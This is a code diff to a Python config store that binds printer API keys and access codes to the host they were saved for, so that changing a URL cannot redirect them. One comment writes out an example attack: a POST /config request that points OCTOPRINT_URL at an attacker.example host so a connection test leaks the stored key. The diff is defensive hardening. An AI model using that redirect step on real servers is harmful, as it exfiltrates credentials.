@@ -11,7 +11,8 @@ import os
 import time
 from datetime import datetime, timezone
 from pathlib import Path
-from typing import Dict, Optional
+from typing import Callable, Dict, NamedTuple, Optional
+from urllib.parse import urlparse
 
 from cryptography.fernet import Fernet
 
@@ -44,7 +45,53 @@ CONFIG_KEYS = {
     "BAMBU_IP": {"label": "Bambu Lab IP Address", "secret": False, "required": False, "description": "e.g. 192.168.1.150"},
     "BAMBU_CODE": {"label": "Bambu Lab LAN Access Code", "secret": True, "required": False, "description": "From printer Settings > Network > LAN Mode"},
     "LOG_LEVEL": {"label": "Log Level", "secret": False, "required": False, "description": "INFO | DEBUG"},
+    # The host each printer credential above was saved for. Written by `set()` when
+    # the credential is written, never by a person — see `PRINTER_CREDENTIAL_HOSTS`.
+    "OCTOPRINT_API_KEY_HOST": {
+        "label": "OctoPrint API Key — bound host", "secret": False, "required": False,
+        "internal": True,
+        "description": "Recorded from OCTOPRINT_URL when the key is saved",
+    },
+    "MOONRAKER_API_KEY_HOST": {
+        "label": "Moonraker API Key — bound host", "secret": False, "required": False,
+        "internal": True,
+        "description": "Recorded from MOONRAKER_URL when the key is saved",
+    },
+    "BAMBU_CODE_HOST": {
+        "label": "Bambu LAN Access Code — bound host", "secret": False, "required": False,
+        "internal": True,
+        "description": "Recorded from BAMBU_IP when the code is saved",
+    },
 }
+
+#: Each printer credential, the key recording the host it was saved for, and the key
+#: holding the address it is meant for.
+#:
+#: A stored printer key is a secret this server *sends*, and the address it is sent to
+#: is a second stored value that anyone who can reach `POST /config` can change. So
+#: `POST /config {"key": "OCTOPRINT_URL", "value": "http://attacker.example/"}` followed
+#: by a connection test made the server deliver the real OctoPrint key to a host of the
+#: caller's choosing — a confused deputy, and one masking the key in `GET /config` does
+#: nothing about, because the attacker never needed to read it.
+#:
+#: The binding closes that: the host is recorded **beside the credential, at the moment
+#: the credential is written**, and the credential is sent only to that host. Changing
+#: the address on its own therefore cannot move the secret; re-saving the key is the
+#: act that re-binds it, and that is a decision a person makes about a host they
+#: already typed.
+PRINTER_CREDENTIAL_HOSTS = {
+    "OCTOPRINT_API_KEY": ("OCTOPRINT_API_KEY_HOST", "OCTOPRINT_URL"),
+    "MOONRAKER_API_KEY": ("MOONRAKER_API_KEY_HOST", "MOONRAKER_URL"),
+    "BAMBU_CODE": ("BAMBU_CODE_HOST", "BAMBU_IP"),
+}
+
+#: Keys the store maintains itself. They are real `CONFIG_KEYS` — `set()` has to accept
+#: them — but the HTTP surface refuses them and the Settings page never lists them: a
+#: writable `OCTOPRINT_API_KEY_HOST` would be the hole `PRINTER_CREDENTIAL_HOSTS`
+#: exists to close, reopened by one more request.
+INTERNAL_CONFIG_KEYS = frozenset(
+    host_key for host_key, _ in PRINTER_CREDENTIAL_HOSTS.values()
+)
 
 #: Keys this store used to accept and no longer does. `purge_retired_keys()` deletes
 #: their rows, because `set()` refuses an unknown key and `CONFIG_KEYS` is what the
@@ -86,12 +133,16 @@ SUBPROCESS_ENV_KEYS = {
         "it into pipeline-runner's HF_TOKEN and HUGGINGFACE_HUB_TOKEN."
     ),
     "OCTOPRINT_URL": (
-        "pythonsrc/run_operator.py and pythonsrc/config.py — the printer address. "
-        "Compose also interpolates it into pipeline-runner."
+        "pythonsrc/config.py — the printer address, and pipeline.py's --octoprint-url "
+        "default. Compose also interpolates it into pipeline-runner. Not read by "
+        "run_operator.py, which takes the resolved DS_PRINTER_URL."
     ),
     "OCTOPRINT_API_KEY": (
-        "pythonsrc/run_operator.py and pythonsrc/operators/octoprint_operator.py — "
-        "used when the printer profile carries no key of its own."
+        "pythonsrc/config.py and pipeline.py's --octoprint-key default. Not read by "
+        "run_operator.py: the dispatch gate resolves a credential for the target's "
+        "own firmware and hands it over as DS_PRINTER_KEY, because a key named after "
+        "one firmware beside an address resolved for another is a pairing the host "
+        "binding cannot see."
     ),
 }
 
@@ -108,6 +159,134 @@ READ_BREAKER_S = 30.0
 def default_config_key_path() -> str:
     """`$DS_CONFIG_KEY_PATH`, else `~/.ds-mvp/.config_key`."""
     return os.environ.get(CONFIG_KEY_PATH_ENV) or str(Path.home() / ".ds-mvp" / ".config_key")
+
+
+#: Ports that are already implied by a scheme, so `http://printer` and
+#: `http://printer:80` are one host rather than two.
+_DEFAULT_PORTS = {"http": "80", "https": "443", "ws": "80", "wss": "443"}
+
+
+def credential_host(address: Optional[str]) -> Optional[str]:
+    """The host a stored printer address points at, in a comparable form.
+
+    Scheme, host and port, lowercased, with a default port dropped and any userinfo
+    removed. The *path* is deliberately not part of it: a path cannot move a request
+    to another machine, and treating `http://printer/` and `http://printer` as
+    different hosts would demand a re-entered key for a trailing slash.
+
+    `BAMBU_IP` is a bare address rather than a URL, so a value with no scheme is read
+    as one: `192.168.1.150` and `192.168.1.150:8883` both answer here.
+
+    Args:
+        address: A stored URL or bare host, or None.
+
+    Returns:
+        The comparable host, or None when there is nothing to compare.
+    """
+    if not address:
+        return None
+    raw = address.strip()
+    if not raw:
+        return None
+
+    if "://" in raw:
+        parsed = urlparse(raw)
+        scheme = (parsed.scheme or "").lower()
+        netloc = (parsed.netloc or "").lower()
+    else:
+        scheme = ""
+        netloc = raw.split("/")[0].lower()
+
+    if "@" in netloc:
+        netloc = netloc.rsplit("@", 1)[1]
+    if not netloc:
+        return None
+
+    if netloc.startswith("["):          # IPv6 literal, e.g. [::1]:5001
+        host, _, rest = netloc.partition("]")
+        host += "]"
+        port = rest[1:] if rest.startswith(":") else ""
+    elif ":" in netloc:
+        host, _, port = netloc.partition(":")
+    else:
+        host, port = netloc, ""
+
+    if not host:
+        return None
+    if port and port == _DEFAULT_PORTS.get(scheme):
+        port = ""
+
+    authority = f"{host}:{port}" if port else host
+    return f"{scheme}://{authority}" if scheme else authority
+
+
+class BoundCredential(NamedTuple):
+    """What may be sent to the printer address that is configured right now.
+
+    Attributes:
+        value: The credential to send, or None when there is none or it is withheld.
+        stored: Whether a credential is stored at all — "no key" and "a key we will
+            not send" are different states and the UI says so differently.
+        bound_host: The host the stored credential was saved for.
+        target_host: The host the configured address points at now.
+        reason: Why the credential is withheld, phrased for a person, or None.
+    """
+
+    value: Optional[str]
+    stored: bool
+    bound_host: Optional[str]
+    target_host: Optional[str]
+    reason: Optional[str]
+
+    @property
+    def withheld(self) -> bool:
+        """A credential exists and is not being sent."""
+        return self.stored and self.value is None and self.reason is not None
+
+
+def bound_printer_credential(
+    credential_key: str, read: Callable[[str], Optional[str]]
+) -> BoundCredential:
+    """Resolve one printer credential against the address it would be sent to.
+
+    The single answer to "may this key go out on this request", used by the connection
+    test, by the job's own printer probe, by `resolve_printer_target` and by the
+    dispatch gate — one rule in one place, because the shape came back the moment
+    two call sites each decided for themselves.
+
+    Args:
+        credential_key: A key of `PRINTER_CREDENTIAL_HOSTS`.
+        read: How to read a stored value. `ConfigStore.get` at a call site that has
+            not read the store yet, `some_dict.get` at one that already has.
+
+    Returns:
+        A `BoundCredential`.
+    """
+    host_key, url_key = PRINTER_CREDENTIAL_HOSTS[credential_key]
+    value = read(credential_key) or None
+    bound = credential_host(read(host_key))
+    target = credential_host(read(url_key))
+
+    if value is None:
+        return BoundCredential(None, False, bound, target, None)
+    if target is None:
+        # Nowhere to send it. Every caller reports the missing address itself, and a
+        # second complaint about the key would only obscure that.
+        return BoundCredential(None, True, bound, target, None)
+    if bound == target:
+        return BoundCredential(value, True, bound, target, None)
+
+    if bound is None:
+        # Either saved while no address was configured, or saved before the binding
+        # existed at all. Both are "we do not know who this key belongs to", and the
+        # answer to both is the same one act.
+        reason = f"The key is not bound to a host; re-enter it to send it to {target}"
+    else:
+        reason = (
+            f"{url_key} changed since the key was saved; "
+            "re-enter the key to send it to the new host"
+        )
+    return BoundCredential(None, True, bound, target, reason)
 
 
 class ConfigStore:
@@ -217,7 +396,14 @@ class ConfigStore:
         return None
 
     def set(self, key: str, value: str):
-        """Encrypt and store a configuration value."""
+        """Encrypt and store a configuration value.
+
+        Writing a printer credential also records the host it was written for, so the
+        key can never be sent anywhere else — see `PRINTER_CREDENTIAL_HOSTS`. That
+        binding is a property of the *write*, which is why it lives here rather than
+        in the endpoint: `applyOctoprintSimulator`, a test fixture and the operator
+        all save keys without going through `POST /config`.
+        """
         if key not in CONFIG_KEYS:
             raise ValueError(f"Unknown config key: {key}")
 
@@ -233,6 +419,32 @@ class ConfigStore:
                 (key, encrypted, now),
             )
 
+        if key in PRINTER_CREDENTIAL_HOSTS:
+            self.bind_credential_host(key)
+
+    def bind_credential_host(self, credential_key: str) -> Optional[str]:
+        """Record the host a just-saved printer credential belongs to.
+
+        Args:
+            credential_key: A key of `PRINTER_CREDENTIAL_HOSTS`.
+
+        Returns:
+            The host recorded, or None when no address is configured — in which case
+            the binding row is removed rather than left saying something stale, and
+            the credential stays unsendable until it is saved again beside an address.
+        """
+        host_key, url_key = PRINTER_CREDENTIAL_HOSTS[credential_key]
+        host = credential_host(self.get(url_key))
+        if host is None:
+            self.delete(host_key)
+        else:
+            self.set(host_key, host)
+        return host
+
+    def bound_credential(self, credential_key: str) -> "BoundCredential":
+        """`bound_printer_credential` against this store."""
+        return bound_printer_credential(credential_key, self.get)
+
     def get_all(self) -> Dict[str, str]:
         """Every stored configuration as key -> plaintext value."""
         results = {}
@@ -247,9 +459,13 @@ class ConfigStore:
         return results
 
     def delete(self, key: str):
-        """Delete a configuration value."""
+        """Delete a configuration value, and any host binding that only described it."""
         with connection(self.dsn) as conn:
             conn.execute(f"DELETE FROM {CONFIG_TABLE} WHERE key = %s", (key,))
+
+        binding = PRINTER_CREDENTIAL_HOSTS.get(key)
+        if binding:
+            self.delete(binding[0])
 
     def purge_retired_keys(self) -> list:
         """Delete the rows of keys this store no longer accepts.
